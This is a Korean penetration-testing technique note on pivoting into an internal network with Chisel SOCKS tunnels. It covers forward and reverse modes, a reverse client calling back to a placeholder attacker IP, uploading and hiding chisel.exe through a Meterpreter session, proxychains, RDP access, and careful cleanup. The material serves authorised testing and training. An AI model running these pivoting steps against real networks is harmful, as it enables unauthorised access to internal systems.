---
tags:
  - 환경/linux
  - 환경/windows
시작조건: ["공격 호스트에서 직접 도달하지 못하는 <INTERNAL_IP>:<PORT> TCP 서비스 존재", "피벗 호스트 셀 확보", "피벗 호스트에서 <INTERNAL_IP>:<PORT> 연결 가능"]
필요권한: ["피벗 호스트에서 Chisel 바이너리를 실행할 현재 계정 권한"]
필요조건: ["forward 방식은 공격 호스트에서 <PIVOT_IP>:1234/TCP로 연결 가능", "reverse 방식은 피벗 호스트에서 <ATTACKER_IP>:1234/TCP로 연결 가능", "피벗 호스트에서 <INTERNAL_IP>:<PORT> TCP 연결 가능"]
결과: ["공격 호스트의 로컬 SOCKS 프록시", "공격 호스트에서 <INTERNAL_IP>:<PORT>까지의 TCP 경로"]
---

# Chisel SOCKS 터널링

## 한 줄 판단

공격 호스트에서 `<INTERNAL_IP>:<PORT>`에 직접 도달하지 못하지만 셀을 보유한 `<PIVOT_IP>`에서 해당 TCP 서비스에 연결할 수 있으면, Chisel server/client를 각 호스트에서 실행해 공격 호스트에 SOCKS 프록시와 내부 TCP 경로를 만든다.

## 사용할 때

- 현재 보유 정보·접근: 공격 호스트에서는 `<INTERNAL_IP>:<PORT>`가 닫히지만, 피벗 호스트의 셀에서는 `nc -vz <INTERNAL_IP> <PORT>`가 성공한다.
- 명령 실행 위치: Chisel server는 선택한 연결 방향의 listener 호스트에서, client는 그 listener로 연결할 호스트에서 실행한다. listener·SOCKS·최종 서비스 연결은 [[피벗과 터널의 연결 경계]]처럼 별도 상태로 판단한다.
- 현재 계정·권한: 피벗 호스트에 SSH 계정이 없어도 되지만, 현재 셀 계정으로 OS·아키텍처에 맞는 Chisel 바이너리를 실행할 수 있어야 한다.
- 지금 가능한 행동: 공격 호스트가 `<PIVOT_IP>:1234/TCP`로 연결할 수 있으면 forward, 피벗 호스트만 `<ATTACKER_IP>:1234/TCP`로 나갈 수 있으면 reverse SOCKS를 사용한다.
- 성공 범위: 공격 호스트의 SOCKS 포트에서 `<INTERNAL_IP>:<PORT>`까지 TCP를 전달할 수 있게 되며, 내부 서비스 인증·원격 명령 실행·관리자 권한은 별도로 검증해야 한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 공격 호스트↔피벗 호스트 중 최소 한 방향으로 `1234/TCP` 연결 가능 | forward는 공격 호스트→`<PIVOT_IP>:1234`, reverse는 피벗 호스트→`<ATTACKER_IP>:1234` 경로를 확인 | listener 바인딩 주소, VPN IP, 방화벽과 egress 방향 재확인 |
| 현재 계정 또는 인증 수단 | 피벗 호스트의 유지 중인 셀 | `whoami`, `hostname` | 셀 재연결 방법과 파일 전송 경로 확인 |
| 현재 권한 | 현재 계정으로 Chisel 실행 가능 | `uname -a` 또는 `systeminfo`로 OS·아키텍처를 확인하고 바이너리 실행 | 바이너리 아키텍처, libc, 실행 권한 확인 |
| 공격 대상의 조건 | 피벗 호스트에서 `<INTERNAL_IP>:<PORT>` TCP 연결 가능 | `nc -vz <INTERNAL_IP> <PORT>` | 피벗 호스트의 route·DNS·방화벽과 대상 listener 확인 |
| 필요한 파일·목록·주소 | 양쪽 OS·아키텍처에 맞는 Chisel과 `<ATTACKER_IP>`, `<PIVOT_IP>`, `<INTERNAL_IP>`, `<PORT>` | 바이너리 버전과 각 호스트의 주소를 비교 | 적합한 release와 올바른 인터페이스 주소로 교체 |

현재 Chisel 공식 배포판은 빌드에 사용한 Go의 최소 OS 조건 때문에 Windows 10·Windows Server 2016 이상을 요구한다. 더 오래된 Windows에서는 공식 안내에 따라 v1.8.1 이하를 검토하며, 양쪽 Chisel 버전과 아키텍처를 실행 전에 기록한다.

## 실행

### 선택 기준
| 단서 | 의미 | 다음 행동 |
|---|---|---|
| 공격 호스트에서 `<PIVOT_IP>:1234` 접근 가능 | forward SOCKS 가능 | 피벗에서 server, 공격 호스트에서 client |
| 피벗 호스트에서만 공격 호스트로 egress 가능 | reverse SOCKS가 적합 | 공격 호스트에서 `--reverse` server |
| Chisel 실행 오류 | libc/아키텍처/버전 문제 | 대상 OS/아키텍처에 맞는 release 사용 |

### 절차
1. 공격 호스트와 피벗 호스트에서 각각 OS·아키텍처에 맞는 Chisel 바이너리를 준비한다.
2. forward라면 피벗 호스트에서 server, 공격 호스트에서 client를 실행한다. reverse라면 공격 호스트에서 `--reverse` server, 피벗 호스트에서 client를 실행한다.
3. 공격 호스트에 생성된 로컬 SOCKS 포트와 protocol을 ProxyChains 설정에 맞춘다.
4. 공격 호스트에서 `proxychains nc`로 `<INTERNAL_IP>:<PORT>`를 먼저 검증한 뒤, 같은 SOCKS 경로로 서비스 클라이언트를 실행한다.

### 작업 전 상태와 식별값 기록

실행 전에 공격 호스트와 피벗 호스트에서 사용할 바이너리의 절대 경로, 기존 파일 여부, Chisel 프로세스와 예정 포트의 listener를 확인한다. `<ATTACK_CHISEL_PATH>`, `<PIVOT_CHISEL_PATH>`, `<CHISEL_PROXYCHAINS_CONF>`는 이번 작업에서 선택한 실제 절대 경로로 바꾸고, 기존 파일과 겹치면 덮어쓰지 않는다.

공격 호스트의 Linux 셸:

```bash
realpath '<ATTACK_CHISEL_PATH>'
test -e '<CHISEL_PROXYCHAINS_CONF>' && ls -l -- '<CHISEL_PROXYCHAINS_CONF>'
ps -eo pid=,lstart=,args= | grep '[c]hisel'
ss -ltnp 'sport = :1234'
ss -ltnp 'sport = :1080'
ss -ltnp 'sport = :1083'
```

Linux 피벗을 사용하는 경우의 피벗 호스트 셸:

```bash
realpath '<PIVOT_CHISEL_PATH>'
ps -eo pid=,lstart=,args= | grep '[c]hisel'
ss -ltnp 'sport = :1234'
```

- 예정 포트를 다른 PID가 이미 수신 중이면 그 프로세스를 종료하거나 덮어쓰지 말고 다른 포트를 선택한다.
- 실행 직후 같은 명령을 다시 확인해 새로 생긴 정확한 명령행과 listener 소유 PID를 `<ATTACK_CHISEL_PID>`, `<PIVOT_CHISEL_PID>`로 기록한다. 값은 현재 작업 기록에만 두고 Vault에 실제 호스트 정보나 자격 증명을 저장하지 않는다.
- 바이너리가 작업 전에 이미 있었다면 이 절차의 복구 대상 파일이 아니다. 이번 작업에서 별도 경로로 반입한 파일만 `생성함`으로 표시한다.

### Forward SOCKS

```bash
'<PIVOT_CHISEL_PATH>' server -v -p 1234 --socks5
'<ATTACK_CHISEL_PATH>' client -v <PIVOT_IP>:1234 socks
```

확인할 출력:

- 공격 호스트의 Chisel client 쪽에 로컬 SOCKS listener가 생성된다. listener 생성은 터널 구성 성공이며, 아직 내부 서비스 인증 성공을 의미하지 않는다.

### Reverse SOCKS

```bash
sudo '<ATTACK_CHISEL_PATH>' server --reverse -v -p 1234 --socks5
'<PIVOT_CHISEL_PATH>' client -v <ATTACKER_IP>:1234 R:1083:socks
```

확인할 출력:

- 공격 호스트의 Chisel server 쪽 `127.0.0.1:1083`에 reverse SOCKS listener가 생성된다. 피벗 호스트 client 연결 로그와 함께 확인한다.

### Windows Meterpreter 세션에서 Chisel 반입과 실행

Metasploit SOCKS에서 첫 TCP 연결 뒤 다음 연결이 timeout되고 Meterpreter 명령까지 응답하지 않으면, 새 세션을 확보한 뒤 Windows x64용 Chisel 실행 파일을 전송한다. 압축 파일이 아니라 압축을 푼 `chisel.exe`를 사용한다. 먼저 `ls <REMOTE_CHISEL_PATH>`로 경로가 비어 있는지 확인하고, 기존 파일이 있으면 고유한 다른 경로를 선택한다.

```text
meterpreter > ls <REMOTE_CHISEL_PATH>
meterpreter > upload <KALI_WINDOWS_AMD64_CHISEL> <REMOTE_CHISEL_PATH>
meterpreter > execute -f <REMOTE_CHISEL_PATH> -a "client <ATTACKER_IP>:1234 R:1083:socks" -H
```

`execute`가 반환한 PID를 `<WINDOWS_CHISEL_PID>`로 기록하고 `ps`에서 실행 경로와 명령행이 방금 실행한 client인지 확인한다. PID가 출력되지 않으면 `ps`의 실행 경로·시작 시각과 공격 호스트 `1083/TCP` listener 생성 전후를 함께 대조한다.

공격 호스트에서 listener 소유 프로세스와 최종 TCP 연결을 차례로 확인한다.

```bash
ss -ltnp 'sport = :1083'

test ! -e '<CHISEL_PROXYCHAINS_CONF>'
cat > '<CHISEL_PROXYCHAINS_CONF>' <<'EOF'
strict_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1083
EOF

proxychains -f '<CHISEL_PROXYCHAINS_CONF>' nc -vz <INTERNAL_IP> <PORT>
```

`ss`에 `chisel` listener가 보이고 ProxyChains `OK`와 대상 포트 연결 성공이 함께 반환되어야 한다. `upload` 성공만으로 client 실행이나 reverse SOCKS 생성을 판단하지 않는다.

### 내부 RDP 접근

```bash
proxychains nc -vz <INTERNAL_IP> 3389
proxychains xfreerdp /v:<INTERNAL_IP> /u:<USER> /p:'<PASSWORD>'
```

확인할 출력:

- ProxyChains 체인 로그가 `OK`로 표시되면 공격 호스트에서 SOCKS를 거쳐 `<INTERNAL_IP>:3389` TCP까지 도달한 것이다.
- RDP 인증 창은 서비스 응답, GUI 세션은 `<USER>` 인증과 Remote Desktop 로그온 권한 확인이며 관리자 권한은 세션 내에서 별도로 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 피벗 호스트에서 내부 포트 `nc -vz`가 성공함 | 최종 hop은 도달 가능함 | 내부 TCP baseline 확보 | forward 또는 reverse 연결 방향 결정 |
| Chisel 양쪽 로그에 client·session이 연결되고 SOCKS listener가 생김 | server/client와 listener가 정상임 | SOCKS 프록시 생성 | ProxyChains protocol·port 설정 확인 |
| Meterpreter `upload` 뒤 공격 호스트의 `1083/TCP`를 Chisel이 listen | Windows client 실행과 reverse SOCKS 생성 성공 | Metasploit과 분리된 SOCKS 프록시 | `chisel-socks.conf`로 단일 내부 TCP 연결 확인 |
| `proxychains nc` 체인이 `OK`이고 내부 포트가 `open` | SOCKS를 통한 TCP 접근 성공 | 내부 서비스 접근 | 최종 서비스 클라이언트 실행 |
| RDP·웹·DB 클라이언트가 `<INTERNAL_IP>:<PORT>`의 서비스 응답을 받음 | 터널과 최종 TCP 경로가 모두 동작함 | 공격 호스트에서 내부 서비스 접근 | 서비스별 인증, 세션, 실제 권한을 별도 확인 |
| client 연결이 없음 | listener 방향, 주소, 포트 또는 방화벽이 맞지 않음 | 터널 미생성 | 어느 쪽에서 listen하고 connect하는지 재확인 |
| `exec format` 또는 libc 오류 | 대상 OS·arch와 바이너리가 맞지 않음 | Chisel 실행 불가 | 적합한 release로 교체 |
| SOCKS는 열렸지만 `nc`가 실패함 | 내부 대상 또는 SOCKS 설정 문제 | 프록시 listener만 확보 | 피벗 host baseline과 `socks5` 설정 비교 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 바이너리 실행 | Chisel version·arch와 실행 오류 없음 | 피벗 shell 권한으로 실행 가능한지 확인 |
| 내부 hop | 피벗 호스트의 `nc -vz` | 최종 내부 포트 baseline 확정 |
| listener·protocol | Chisel 연결 로그, SOCKS listen, `socks5` 설정 | 세션과 프록시 형식 일치 확인 |
| 최종 TCP | ProxyChains `OK`, `nc open`, 서비스 응답 | listener 생성과 실제 내부 접근을 구분 |

## 변경 영향과 복구

### 이번 절차가 만드는 상태

| 실행 단계 | 생성·변경 항목 | 작업 전 확인과 기록 | 정리 식별값 |
|---|---|---|---|
| Chisel server 시작 | `1234/TCP` listener와 server 프로세스 | 해당 호스트의 `ss -ltnp 'sport = :1234'`, Chisel 프로세스 목록 | 정확한 server PID·실행 경로·명령행 |
| forward client 시작 | 공격 호스트의 `127.0.0.1:1080` SOCKS listener와 client 프로세스 | 공격 호스트의 `1080/TCP` listener | client PID와 `1080/TCP` 소유 PID |
| reverse client 시작 | 공격 호스트 server의 `127.0.0.1:1083` SOCKS listener, 피벗의 client 프로세스 | 공격 호스트의 `1083/TCP` listener | 피벗 client PID와 공격 호스트 server PID |
| Meterpreter `upload` | `<REMOTE_CHISEL_PATH>` | 같은 경로의 파일 존재 여부 | 업로드 경로와 `<WINDOWS_CHISEL_PID>` |
| ProxyChains 설정 작성 | `<CHISEL_PROXYCHAINS_CONF>` | 같은 경로의 파일 존재 여부 | 이번 작업에서 새로 만든 정확한 경로 |

이 절차는 route, TUN 인터페이스와 방화벽 규칙을 만들지 않는다. 별도 작업으로 그런 설정을 추가했다면 이 문서의 Chisel 복구가 완료됐다는 이유로 함께 삭제하지 않는다.

### 연결이 살아 있을 때 정리

하위 피벗 호스트를 먼저 정리한 뒤 공격 호스트를 정리한다. Chisel client는 기본적으로 재연결을 계속 시도할 수 있으므로 server만 종료하고 client를 남기지 않는다.

1. 피벗 호스트에서 기록한 PID의 실행 경로와 명령행이 일치하는지 확인한 뒤 해당 Chisel process에만 종료 신호를 보낸다.

```bash
ps -p <PIVOT_CHISEL_PID> -o pid=,lstart=,args=
kill -TERM <PIVOT_CHISEL_PID>
ps -p <PIVOT_CHISEL_PID> -o pid=,args=
```

마지막 `ps`에 행이 없어야 한다. PID가 다른 명령행으로 재사용됐으면 종료하지 말고 Chisel 로그와 listener 소유 PID로 다시 식별한다. 같은 프로세스가 정상 종료 신호 뒤에도 남아 있을 때만 로그와 연결 상태를 확인한 후 `kill -KILL <PIVOT_CHISEL_PID>`를 사용한다.

2. Windows Meterpreter에서 client를 실행했다면 연결이 살아 있을 때 PID를 다시 확인하고 그 PID만 종료한다. 이번 절차가 업로드한 경로일 때만 파일을 제거한다.

```text
meterpreter > ps
meterpreter > kill <WINDOWS_CHISEL_PID>
meterpreter > ps
meterpreter > rm <REMOTE_CHISEL_PATH>
meterpreter > ls <REMOTE_CHISEL_PATH>
```

`ps`에서 PID가 사라지고 마지막 `ls`가 파일 없음으로 반환되어야 한다. Meterpreter `kill`이나 `rm`이 실패하면 같은 호스트의 독립 PowerShell 세션에서 PID의 실행 경로를 먼저 대조한다.

```powershell
Get-CimInstance Win32_Process -Filter "ProcessId = <WINDOWS_CHISEL_PID>" | Select-Object ProcessId, ExecutablePath, CommandLine
Stop-Process -Id <WINDOWS_CHISEL_PID>
Get-Process -Id <WINDOWS_CHISEL_PID> -ErrorAction SilentlyContinue
Remove-Item -LiteralPath '<REMOTE_CHISEL_PATH>'
Test-Path -LiteralPath '<REMOTE_CHISEL_PATH>'
```

3. 공격 호스트에서 기록한 client 또는 server PID의 명령행을 확인하고 해당 PID만 종료한다. 이어 이번 작업이 만든 ProxyChains 설정만 제거한다.

```bash
ps -p <ATTACK_CHISEL_PID> -o pid=,lstart=,args=
kill -TERM <ATTACK_CHISEL_PID>
ps -p <ATTACK_CHISEL_PID> -o pid=,args=
rm -- '<CHISEL_PROXYCHAINS_CONF>'
test ! -e '<CHISEL_PROXYCHAINS_CONF>'
ss -ltnp 'sport = :1234'
ss -ltnp 'sport = :1080'
ss -ltnp 'sport = :1083'
```

이번 작업 전부터 있던 Chisel 바이너리는 제거하지 않는다. 새 경로로 반입했다고 기록한 바이너리만 프로세스 종료와 경로 재확인 뒤 `rm -- '<CREATED_CHISEL_PATH>'`로 제거한다. 최종 `ss`에 같은 포트가 남아 있으면 PID와 명령행을 확인하며, 다른 프로세스의 listener이면 건드리지 않는다.

### 연결이 이미 끊어진 경우

- 공격 호스트의 기록된 PID·listener·ProxyChains 설정은 위 명령으로 로컬 정리한다.
- 피벗 호스트의 process와 업로드 파일은 독립 셸을 다시 확보한 뒤 같은 PID·경로를 확인한다. 접근할 수 없으면 `원격 정리 미확인`으로 남기며 완료로 기록하지 않는다.
- reverse SOCKS listener가 사라졌더라도 피벗 client가 종료됐다는 증거는 아니다. 반대로 client가 사라져도 공격 호스트 server PID는 계속 실행될 수 있으므로 양쪽을 각각 확인한다.

## 관련 상태 라우터

- 내부 대상까지의 TCP 경로가 검증됐으면: [[내부망 경로 확보 후 피벗 구성]]

## 관련 도구

- [[chisel]]
- [[proxychains]]
- [[netcat]]
- [[xfreerdp]]

## 참고 링크

- [Chisel 공식 저장소와 CLI 사용법](https://github.com/jpillora/chisel)
